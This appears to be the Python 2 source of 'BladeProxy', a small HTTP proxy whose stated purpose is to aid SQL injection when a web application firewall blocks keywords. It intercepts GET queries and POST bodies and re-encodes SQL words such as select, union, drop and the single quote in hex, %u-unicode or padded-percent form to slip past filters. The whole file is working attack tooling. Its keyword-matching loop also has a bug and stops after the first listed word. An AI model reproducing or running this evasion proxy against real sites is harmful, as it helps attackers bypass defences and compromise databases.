
__doc__ = """
                ####################################
                        BladeProxy 0.1.0
                This tool will help u in injection
                when some keywords
                are blocked by web defense system.

                made by: nessus@yahoo.cn

                usage:BladeProxy.py <port> <encodenum>
                encodenum:
                0:not encode
                1:assic encode
                2:unicode encode
                3:%% encode
                #####################################

"""

__version__ = "1.0"
encode_way = 0
#send_way = 0
senwords =['and',
              'select',
              'union',
              'declare',
              "'",
              'char',
              'exists',
              'insert',
              'create',
              'drop'
              ]

import BaseHTTPServer, select, socket, SocketServer, urlparse,re

class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
    __base = BaseHTTPServer.BaseHTTPRequestHandler
    __base_handle = __base.handle

    server_version = "BladeProxy/" + __version__
    rbufsize = 0                        # self.rfile Be unbuffered

    def handle(self):
        (ip, port) =  self.client_address
        if hasattr(self, 'allowed_clients') and ip not in self.allowed_clients:
            self.raw_requestline = self.rfile.readline()
            if self.parse_request(): self.send_error(403)
        else:
            self.__base_handle()

    def _connect_to(self, netloc, soc):
        i = netloc.find(':')
        if i >= 0:
            host_port = netloc[:i], int(netloc[i+1:])
        else:
            host_port = netloc, 80
        print "\t" "connect to %s:%d" % host_port
        try: soc.connect(host_port)
        except socket.error, arg:
            try: msg = arg[1]
            except: msg = arg
            self.send_error(404, msg)
            return 0
        return 1

    def do_CONNECT(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(self.path, soc):
                self.log_request(200)
                self.wfile.write(self.protocol_version +
                                 " 200 Connection established\r\n")
                self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
                self.wfile.write("\r\n")
                self._read_write(soc, 300)
        finally:
            print "\t" "bye"
            soc.close()
            self.connection.close()

    
    def select_encode(self,s):
        print 'encode_way is '+str(encode_way)
        if encode_way ==1: #asc_encode 
            return self.asc_encode(s)
        elif encode_way ==2:#unicode_encode
            return self.unicode_encode(s)
        elif encode_way ==3:#halfper_encode
            return self.halfper_encode(s)
        elif encode_way ==0:#do not encode
            return s
    def do_encode(self,s):
        for senword in senwords:
            if re.search(senword,s) != None:
                encoded_senword = self.select_encode(senword)
                return s.replace(senword,encoded_senword)
            else:
                return s

    def asc_encode(self,s):
        ss = lambda s: ''.join(map(lambda c:"%%%X"%ord(c),s))
        return ss(s)

    def unicode_encode(self,s):
        ss = lambda s: ''.join(map(lambda c:"%%u00%X"%ord(c),s))
        return ss(s)

    def halfper_encode(self,s):
        ss = lambda s: ''.join(map(lambda c:"%%%%%%%c"% c,s))
        return ss(s)
    
    def do_POST(self):
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
            self.path, 'http')
        
        if self.command == 'POST' and not self.headers.has_key('content-length'):
            self.error(400, "Missing Content-Length for POST method")
        
        length = int(self.headers.get('content-length', 0))
        #print 'lenth is'+ self.headers['content-length']
        if length >0:
            content = self.rfile.read(length)
            content = self.do_encode(content)
            self.headers['content-length'] = repr(len(content))
            
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(netloc, soc):
                self.log_request()
                soc.send("%s %s %s\r\n" % (
                    self.command,
                    urlparse.urlunparse(('', '', path, params, '', '')),
                    self.request_version))
                self.headers['Connection'] = 'close'
                del self.headers['Proxy-Connection']
                for key_val in self.headers.items():
                    soc.send("%s: %s\r\n" % key_val)
                soc.send("\r\n")
                soc.send(content)
                self._read_write(soc)
        finally:
            print "\t" "bye"
            soc.close()
            self.connection.close()
   
    def do_GET(self):
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
            self.path, 'http')
        if query:
            query = self.do_encode(query)
            print 'after query is' +query
        
        if scm != 'http' or fragment or not netloc:
            self.send_error(400, "bad url %s" % self.path)
            return
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(netloc, soc):
                self.log_request()
                soc.send("%s %s %s\r\n" % (
                    self.command,
                    urlparse.urlunparse(('', '', path, params, query, '')),
                    self.request_version))
                self.headers['Connection'] = 'close'
                del self.headers['Proxy-Connection']
                for key_val in self.headers.items():
                    soc.send("%s: %s\r\n" % key_val)
                soc.send("\r\n")
                self._read_write(soc)
        finally:
            print "\t" "bye"
            soc.close()
            self.connection.close()

    def _read_write(self, soc, max_idling=20):
        iw = [self.connection, soc]
        ow = []
        count = 0
        while 1:
            count += 1
            (ins, _, exs) = select.select(iw, ow, iw, 3)
            if exs: break
            if ins:
                for i in ins:
                    if i is soc:
                        out = self.connection
                    else:
                        out = soc
                    data = i.recv(8192)
                    if data:
                        out.send(data)
                        count = 0
            else:
                print "\t" "idle", count
            if count == max_idling: break

    do_HEAD = do_GET
    #do_POST = do_GET
    do_PUT  = do_GET
    do_DELETE=do_GET

class ThreadingHTTPServer (SocketServer.ThreadingMixIn,
                           BaseHTTPServer.HTTPServer): pass
if __name__ == '__main__':
    from sys import argv
    if len(argv) == 1:
        print __doc__
    elif len(argv)== 3:
        encode_way = int(argv[2]);
        print "Any clients will be served..."
        BaseHTTPServer.test(ProxyHandler, ThreadingHTTPServer)
